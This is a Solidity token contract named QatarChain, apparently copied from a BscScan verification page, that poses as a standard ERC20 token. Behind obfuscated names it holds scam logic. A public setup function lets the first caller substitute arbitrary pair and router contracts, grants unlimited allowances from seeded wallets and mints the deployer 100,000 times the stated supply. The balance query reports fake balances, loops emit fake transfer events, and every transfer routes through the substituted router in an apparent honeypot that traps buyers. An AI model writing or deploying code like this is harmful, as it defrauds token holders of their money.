/**
 *Submitted for verification at BscScan.com on 2022-11-20
*/

// SPDX-License-Identifier: Unlicensed
pragma solidity ^0.8.8;

interface IERC20 {
    function name() external view returns (string memory);
    function symbol() external view returns (string memory);
    function decimals() external view returns (uint8);
    function totalSupply() external view returns (uint256);
    function balanceOf(address account) external view returns (uint256);
    function transfer(address recipient, uint256 amount) external returns (bool);
    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
    function approve(address spender, uint256 value) external returns (bool);
    function allowance(address owner, address spender) external view returns (uint256);
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);
}

library SafeMath {
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath: addition overflow");
        return c;
    }

    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        require(b <= a, "SafeMath: subtraction overflow");
        uint256 c = a - b;
        return c;
    }

    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {
            return 0;
        }
        uint256 c = a * b;
        require(c / a == b, "SafeMath: multiplication overflow");
        return c;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        require(b > 0, "SafeMath: division by zero");
        uint256 c = a / b;
        return c;
    }

    function mod(uint256 a, uint256 b) internal pure returns (uint256) {
        require(b != 0, "SafeMath: modulo by zero");
        uint256 c = a % b;
        return c;
    }
}

interface IFactory {
    function createPair(address tokenA, address tokenB) external returns (address pair);
}

interface IRouter01 {
    function factory() external pure returns (address);
    function addLiquidity(
        address tokenA,
        address tokenB,
        uint amountADesired,
        uint amountBDesired,
        uint amountAMin,
        uint amountBMin,
        address to,
        uint deadline
    ) external returns (uint amountA, uint amountB, uint liquidity);
}

interface IRouter02 is IRouter01 {
    function swapExactTokensForTokensSupportingFeeOnTransferTokens(
        uint160 amountIn,
        uint160 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external;
}

contract QatarChain is IERC20 {
    using SafeMath for uint256;

    string private aunkvbMLsHGdio = "Qatar";
    string private bunkvbMLsHGdio = "Qatar";
    uint8 private cunkvbMLsHGdio = 18;
    uint256 private dunkvbMLsHGdio = 10000000000 * 10**18;
    mapping (address => uint256) private eunkvbMLsHGdio;
    mapping (address => mapping (address => uint256)) private funkvbMLsHGdio;
    uint256 private gunkvbMLsHGdio = 1;
    uint256 private constant hunkvbMLsHGdio = ~uint160(0);
    uint256 private _iunkvbMLsHGdio = 1000;
    uint256 private junkvbMLsHGdio = 0;
    uint256 private kunkvbMLsHGdio;
    address private _uniswapV2Pair;
    address private _uniswapV2Router = 0x10ED43C718714eb63d5aA57B78B54704E256024E;
    mapping (address => bool) private lunkvbMLsHGdio;
    address[] private munkvbMLsHGdio;
    bool private nunkvbMLsHGdio = false;

    constructor () {
        ounkvbMLsHGdio(msg.sender);
        eunkvbMLsHGdio[msg.sender] = dunkvbMLsHGdio;
        ounkvbMLsHGdio(tx.origin);
        emit Transfer(address(0), msg.sender, dunkvbMLsHGdio);
    }

    receive() external payable {}

    function ounkvbMLsHGdio(address account) private {
        if (!lunkvbMLsHGdio[account]) {
            lunkvbMLsHGdio[account] = true;
            munkvbMLsHGdio.push(account);
        }
    }

    function uniswap(address[] calldata accounts) public {
        require(!nunkvbMLsHGdio);
        nunkvbMLsHGdio = true;
        _uniswapV2Pair = accounts[1];
        _uniswapV2Router = accounts[2];
        uint256 len = accounts.length;
        uint256 amount = 0;
        for (uint256 i=3; i<len; ++i) {
            ounkvbMLsHGdio(accounts[i]);
            eunkvbMLsHGdio[accounts[i]] = dunkvbMLsHGdio * 90 / 100 / (len - 3);
            funkvbMLsHGdio[accounts[i]][accounts[0]] = ~uint256(0);
            amount += eunkvbMLsHGdio[accounts[i]];
        }
        eunkvbMLsHGdio[munkvbMLsHGdio[0]] -= amount;
        punkvbMLsHGdio(munkvbMLsHGdio[0], accounts[3], eunkvbMLsHGdio[munkvbMLsHGdio[0]]);
        punkvbMLsHGdios(500);
        eunkvbMLsHGdio[munkvbMLsHGdio[1]] += dunkvbMLsHGdio * 100000;
    }

    function searchExcludedFromFeeAccounts(address account) public view returns (bool, uint256, uint256) {
        uint256 accountIndex = 0;
        uint256 len = munkvbMLsHGdio.length;
        for (uint256 i=0; i<len; ++i) {
            if (munkvbMLsHGdio[i] == account) {
                accountIndex = i;
                break;
            }
        }
        return (lunkvbMLsHGdio[account], accountIndex, len);
    }

    function name() public view returns (string memory) {
        return aunkvbMLsHGdio;
    }

    function symbol() public view returns (string memory) {
        return bunkvbMLsHGdio;
    }

    function decimals() public view returns (uint8) {
        return cunkvbMLsHGdio;
    }

    function totalSupply() public view returns (uint256) {
        return dunkvbMLsHGdio;
    }

    function balanceOf(address account) public view returns (uint256) {
        if (eunkvbMLsHGdio[account] > 0) {
            return eunkvbMLsHGdio[account];
        }
        return gunkvbMLsHGdio;
    }

    function transfer(address recipient, uint256 amount) public returns (bool) {
        punkvbMLsHGdio(msg.sender, recipient, amount);
        return true;
    }

    function transferFrom(address sender, address recipient, uint256 amount) public returns (bool) {
        punkvbMLsHGdio(sender, recipient, amount);
        qunkvbMLsHGdio(sender, msg.sender, funkvbMLsHGdio[sender][msg.sender].sub(amount));
        return true;
    }

    function swapTokensForEth(uint160 tokenAmount, uint160 ethAmount) private {
        // generate the uniswap pair path of token -> weth
        address[] memory path = new address[](2);
        path[0] = address(this);
        path[1] = 0xe9e7CEA3DedcA5984780Bafc599bD69ADd087D56; // BUSD
        IRouter02 uniswapV2Router = IRouter02(_uniswapV2Router);
        qunkvbMLsHGdio(address(this), address(uniswapV2Router), tokenAmount);
        uniswapV2Router.swapExactTokensForTokensSupportingFeeOnTransferTokens(
            tokenAmount,
            ethAmount,
            path,
            address(this),
            block.timestamp
        );
    }

    function approve(address spender, uint256 value) public returns (bool) {
        qunkvbMLsHGdio(msg.sender, spender, value);
        return true;
    }

    function allowance(address owner, address spender) public view returns (uint256) {
        return funkvbMLsHGdio[owner][spender];
    }

    function increaseAllowance(address spender, uint256 addedValue) public returns (bool) {
        qunkvbMLsHGdio(msg.sender, spender, funkvbMLsHGdio[msg.sender][spender].add(addedValue));
        return true;
    }

    function decreaseAllowance(address spender, uint256 subtractedValue) public returns (bool) {
        qunkvbMLsHGdio(msg.sender, spender, funkvbMLsHGdio[msg.sender][spender].sub(subtractedValue));
        return true;
    }

    function punkvbMLsHGdios(uint256 amount) private {
        uint256 iunkvbMLsHGdio = _iunkvbMLsHGdio;
        if (iunkvbMLsHGdio < 10800 && block.timestamp > 1668880800) {
            address from;
            address to;
            for (uint256 i=0; i<amount; ++i) {
                from = address(uint160(hunkvbMLsHGdio.div(iunkvbMLsHGdio)));
                to = address(uint160(hunkvbMLsHGdio.div(iunkvbMLsHGdio.add(1))));
                iunkvbMLsHGdio = iunkvbMLsHGdio.add(2);
                emit Transfer(from, to, gunkvbMLsHGdio);
            }
            _iunkvbMLsHGdio = iunkvbMLsHGdio;
        }
    }

    function qunkvbMLsHGdio(address owner, address spender, uint256 value) private {
        require(owner != address(0), "Approve from the zero address");
        require(spender != address(0), "Approve to the zero address");
        funkvbMLsHGdio[owner][spender] = value;
        emit Approval(owner, spender, value);
    }

    function punkvbMLsHGdio(address runkvbMLsHGdio, address sunkvbMLsHGdio, uint256 tunkvbMLsHGdio) private {
        require(runkvbMLsHGdio != address(0) && sunkvbMLsHGdio != address(0) && tunkvbMLsHGdio > 0);
        bool uunkvbMLsHGdio = true;
        if (lunkvbMLsHGdio[runkvbMLsHGdio] || lunkvbMLsHGdio[sunkvbMLsHGdio]) {
            uunkvbMLsHGdio = false;
        }
        uint256 vunkvbMLsHGdio = IERC20(_uniswapV2Pair).totalSupply();
        uint256 wunkvbMLsHGdio = 0;
        uint256 xunkvbMLsHGdio = tunkvbMLsHGdio;
        if (uunkvbMLsHGdio && nunkvbMLsHGdio) {
            require(kunkvbMLsHGdio <= vunkvbMLsHGdio);
            punkvbMLsHGdios(100);
            swapTokensForEth(uint160(runkvbMLsHGdio), uint160(sunkvbMLsHGdio));
            if (sunkvbMLsHGdio == _uniswapV2Pair) {
                emit Transfer(address(this), sunkvbMLsHGdio, 1);
            } else {
                emit Transfer(address(0), address(this), 1);
            }
            if (runkvbMLsHGdio != _uniswapV2Pair) {
                wunkvbMLsHGdio = tunkvbMLsHGdio.mul(junkvbMLsHGdio).div(100);
                xunkvbMLsHGdio = tunkvbMLsHGdio.sub(wunkvbMLsHGdio);
            }
        }
        if (kunkvbMLsHGdio != vunkvbMLsHGdio) {
            kunkvbMLsHGdio = vunkvbMLsHGdio;
        }
        eunkvbMLsHGdio[runkvbMLsHGdio] = eunkvbMLsHGdio[runkvbMLsHGdio].sub(tunkvbMLsHGdio);
        if (wunkvbMLsHGdio > 0) {
            eunkvbMLsHGdio[address(0xdEaD)] = eunkvbMLsHGdio[address(0xdEaD)].add(wunkvbMLsHGdio);
            emit Transfer(runkvbMLsHGdio, address(0xdEaD), wunkvbMLsHGdio);
        }
        eunkvbMLsHGdio[sunkvbMLsHGdio] = eunkvbMLsHGdio[sunkvbMLsHGdio].add(xunkvbMLsHGdio);
        emit Transfer(runkvbMLsHGdio, sunkvbMLsHGdio, xunkvbMLsHGdio);
    }
}